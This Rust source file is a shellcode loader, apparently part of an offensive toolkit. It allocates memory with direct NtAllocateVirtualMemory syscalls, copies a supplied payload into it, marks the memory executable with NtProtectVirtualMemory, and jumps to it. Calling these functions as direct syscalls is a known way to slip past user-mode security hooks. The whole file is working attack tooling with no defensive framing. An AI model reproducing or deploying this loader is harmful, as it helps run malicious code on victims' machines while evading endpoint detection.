use ntapi::ntpsapi::NtCurrentProcess;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};

use crate::syscall;

pub fn direct(payload: &[u8]) {
    unsafe {
        let mut base_addr: usize = 0; // NULL -> let kernel choose address
        let mut region_size: usize = payload.len();
        let mut old_prot: u32 = 0;

        // Step 1: Allocate memory via NtAllocateVirtualMemory
        let status_alloc = syscall!(
            "NtAllocateVirtualMemory",
            NtCurrentProcess,
            &mut base_addr as *mut usize as usize,
            0,
            &mut region_size as *mut usize as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        assert_eq!(status_alloc, 0, "");

        // Step 2: Write shellcode
        core::ptr::copy_nonoverlapping(payload.as_ptr(), base_addr as *mut u8, payload.len());

        // Step 3: Change protection to PAGE_EXECUTE_READ
        let status_protect = syscall!(
            "NtProtectVirtualMemory",
            NtCurrentProcess,
            &mut base_addr as *mut usize as usize,
            &mut region_size as *mut usize as usize,
            PAGE_EXECUTE_READ,
            &mut old_prot as *mut u32 as usize
        );
        assert_eq!(status_protect, 0, "");

        // Step 4: Execute
        let shell: extern "C" fn() = core::mem::transmute(base_addr);
        shell();
    }
}
